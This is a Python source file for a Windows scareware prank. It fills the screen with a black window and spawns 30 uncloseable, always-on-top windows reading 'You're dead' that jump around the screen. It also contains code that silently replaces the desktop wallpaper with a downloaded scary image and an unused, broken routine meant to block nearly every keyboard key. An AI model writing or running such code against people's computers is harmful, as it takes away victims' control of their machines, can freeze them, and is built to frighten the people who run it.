import tkinter as tk
from PIL import Image, ImageTk
import requests
from io import BytesIO
import os
import webbrowser
import ctypes
import random
import pygame

pygame.mixer.init()
AUDIO_URL = "https://cdn.freesound.org/previews/97/97994_1143716-lq.mp3"  

def play_audio(url):
    
    response = requests.get(url)
    audio_path = os.path.join(os.getenv('TEMP'), "audio.mp3")
    with open(audio_path, 'wb') as file:
        file.write(response.content)
    
    
    pygame.mixer.music.load(audio_path)
    pygame.mixer.music.play()  

def block_keyboard():
    keys = [
        'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
        '1', '2', '3', '4', '5', '6', '7', '8', '9', '0',
        'esc', 'tab', 'caps_lock', 'shift', 'ctrl', 'alt', 'win', 'enter', 'space', 'backspace', 'delete',
        'arrow_up', 'arrow_down', 'arrow_left', 'arrow_right',
        'f1', 'f2', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 'f11', 'f12',
        'home', 'end', 'page_up', 'page_down', 'insert'
    ]
    while True:
        for key in keys:
            keyboard.block_key(key)
        time.sleep(0.1)  

class CustomMessageBox(tk.Tk):
    def __init__(self):
        super().__init__()
        
        self.title("Confirmation")
        self.attributes('-fullscreen', True)  
        self.configure(bg='black')
        
        self.message_label = tk.Label(self, text="Do you want to open?", fg="white", bg="black", font=("Arial", 24, "bold"))
        self.message_label.pack(pady=20)

        
        self.dummy_button = tk.Button(self, text="Do Nothing", command=self.dummy_button_click)
        self.dummy_button.pack(pady=20)

    def dummy_button_click(self):
        

        self.create_moving_windows()
    
    def create_moving_windows(self):
        for _ in range(30):  #there if is over like 50 your pc gonna be freze         
            MovingWindow(self, text="You're dead")

    def yes_button_click(self):
        self.open_image()
        self.set_desktop_wallpaper()
        self.destroy()
    
    def no_button_click(self):
        self.open_image()
        self.set_desktop_wallpaper()
        self.destroy()
    
    def open_image(self):
        image_url = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTr-NouRrPP2NCmoN13x54mbO9o9NK8Cv33GQ&s"
        webbrowser.open(image_url)
    
    def set_desktop_wallpaper(self):
        wallpaper_url = "https://mrwallpaper.com/images/hd/download-scary-wallpaper-ba5ikabjn20n3ev0.jpg"
        response = requests.get(wallpaper_url)
        image = Image.open(BytesIO(response.content))
        
        temp_image_path = os.path.join(os.getenv('TEMP'), "wallpaper.jpg")
        image.save(temp_image_path)
        
        ctypes.windll.user32.SystemParametersInfoW(20, 0, temp_image_path, 3)
class MovingWindow(tk.Toplevel):
    def __init__(self, master=None, text="Are you dead?", **kwargs):
        super().__init__(master, **kwargs)
        self.title(text)
        self.geometry('400x200')  
        self.configure(bg='black')
        self.protocol("WM_DELETE_WINDOW", self.disable_event)  
        self.attributes('-topmost', True)  
        
        self.label = tk.Label(self, text=text, fg="white", bg="black", font=("Arial", 18, "bold"))
        self.label.pack(expand=True)
        
        self.update_position()

    def disable_event(self):
        
        pass

    def update_position(self):
        
        screen_width = self.winfo_screenwidth()
        screen_height = self.winfo_screenheight()
        
        max_x = screen_width - self.winfo_width()
        max_y = screen_height - self.winfo_height()
        
        new_x = random.randint(0, max_x)
        new_y = random.randint(0, max_y)
        
        self.geometry(f'+{new_x}+{new_y}')
        self.after(120, self.update_position) 


if __name__ == "__main__":
    app = CustomMessageBox()
    app.mainloop()
